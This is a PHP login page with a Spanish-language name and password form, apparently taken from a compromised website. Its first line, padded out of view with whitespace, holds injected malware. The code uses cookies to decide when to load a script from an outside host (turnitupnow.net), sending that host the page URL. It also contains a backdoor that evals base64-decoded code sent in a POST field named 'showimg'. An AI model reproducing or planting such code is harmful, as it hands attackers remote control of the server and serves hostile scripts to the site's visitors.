<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
  ?>
<p>login.php</p>
    <table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="295" height="40">&nbsp;</td>
        <td width="7" background="resources/linea.PNG">&nbsp;</td>
        <td width="678"><form id="form1" name="form1" method="post" action="index.php?login&menu=<?php echo $menu ?>">
          <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
            <tr>
              <td width="140" height="28" align="center" bgcolor="#F7F7F7" class="texte_normal">Identificate: Nombre</td>
              <td width="166" align="center" bgcolor="#F7F7F7"><label>
                <input name="nombre" type="text" class="texte_normal" id="nombre" />
              </label></td>
              <td width="88" align="center" bgcolor="#F7F7F7" class="texte_normal">Contraseña</td>
              <td width="166" align="center" bgcolor="#F7F7F7"><input name="pass" type="text" class="texte_normal" id="pass" /></td>
              <td width="80" align="center" bgcolor="#F7F7F7"><label>
                <input type="image" src="resources/bt_buscar.png" name="button" id="button" value="Enviar" />
              </label></td>
            </tr>
          </table>
        </form></td>
      </tr>
    </table>
    
<?php  ?>